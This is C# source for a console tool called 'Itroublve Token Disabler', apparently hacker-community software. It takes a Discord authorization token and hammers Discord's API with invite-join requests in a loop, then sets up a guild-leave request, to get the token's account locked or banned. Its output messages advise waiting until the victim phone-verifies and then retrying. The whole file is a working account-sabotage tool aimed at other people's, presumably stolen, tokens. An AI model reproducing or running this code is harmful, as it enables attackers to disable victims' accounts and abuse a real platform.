using System;
using System.Collections.Specialized;
using System.IO;
using System.Net;
using System.Threading;

namespace DiscordTokenDisabler
{
    public class Program
    {
        public static void Main()
        {
            Console.Title = "Itroublve Token Disabler";
            Console.ForegroundColor = ConsoleColor.Cyan;
            Console.OutputEncoding = System.Text.Encoding.Unicode;
            Console.WriteLine($@"  _______   __                      __        __                     ");
            Console.WriteLine($@" |       \ |  \                    |  \      |  \                    ");
            Console.WriteLine($@" | $$$$$$$\ \$$  _______   ______  | $$____  | $$  ______    ______  ");
            Console.WriteLine($@" | $$  | $$|  \ /       \ |      \ | $$    \ | $$ /      \  /      \ ");
            Console.WriteLine($@" | $$  | $$| $$|  $$$$$$$  \$$$$$$\| $$$$$$$\| $$|  $$$$$$\|  $$$$$$\");
            Console.WriteLine($@" | $$  | $$| $$ \$$    \  /      $$| $$  | $$| $$| $$    $$| $$   \$$");
            Console.WriteLine($@" | $$__/ $$| $$ _\$$$$$$\|  $$$$$$$| $$__/ $$| $$| $$$$$$$$| $$      ");
            Console.WriteLine($@" | $$    $$| $$|       $$ \$$    $$| $$    $$| $$ \$$     \| $$     ");
            Console.WriteLine($@"  \$$$$$$$  \$$ \$$$$$$$   \$$$$$$$ \$$$$$$$  \$$  \$$$$$$$ \$$      ");
            Console.WriteLine($@" ._______________________________________________.
 |                                               |
 | Official Website: https://itroublvehacker.xyz |
 | Special Human: https://ichhackenet.de         |
 |_______________________________________________|");
            Console.WriteLine(Environment.NewLine);
            Console.ResetColor();
            new DiscordToken();
            Console.ReadLine();
        }
    }

    public class DiscordToken
    {
        public DiscordToken()
        {
            DisableToken();
        }
        public void DisableToken()
        {
            Console.WriteLine("Enter token to disable/lock");
            string ban = Console.ReadLine();
            string sad = null;
            Console.Write("Trying to disable token...");
            while (true)
            {
                try
                {

                    using WebClient webClient = new WebClient();
                    NameValueCollection nameValueCollection = new NameValueCollection();
                    nameValueCollection[""] = "";
                    webClient.Headers.Add("Authorization", ban);
                    webClient.UploadValues("https://discord.com/api/v8/invites/hwcVZQw", nameValueCollection);
                    sad = "x";
                }
                catch (Exception x)
                {
                    if (sad == null)
                    {
                        if (x.Message.Contains("401"))
                        {
                            Console.WriteLine("Invalid token");
                        }
                        Console.WriteLine("Token can't be disabled right now! Try again later? Maybe after 10y? or 20y?");
                        break;
                    }
                    Thread.Sleep(1000);
                    try
                    {
                        using WebClient webClient = new WebClient();
                        NameValueCollection nameValueCollection = new NameValueCollection();
                        nameValueCollection[""] = "";
                        webClient.Headers.Add("Authorization", ban);
                        webClient.UploadValues("https://discord.com/api/v8/invites/jjPsxg", nameValueCollection);
                        WebRequest webRequest = WebRequest.Create(new Uri("https://discord.com/api/v8/users/@me/guilds/529415233899593732"));
                        HttpWebRequest httpWebRequest = (HttpWebRequest)webRequest;
                        httpWebRequest.Accept = "application/json";
                        httpWebRequest.Method = "DELETE";
                        httpWebRequest.Headers.Add("Authorization", ban);
                    }
                    catch (WebException ex)
                    {
                        string text = new StreamReader(ex.Response.GetResponseStream()).ReadToEnd();
                        if (text.Contains("401: Unauthorized"))
                        {
                            Console.WriteLine("Successfully banned token!");
                            break;
                        }
                        else if (text.Contains("You need to verify your account in order to perform this action."))
                        {
                            Console.Write("Successfully locked token, to disable token it must be phone verified.\nThings you can do:\nWait till user phone verifies token and retry or make a code which can check when token is valid & alert you :>");
                            break;
                        }
                    }
                }
            }
        }
    }
}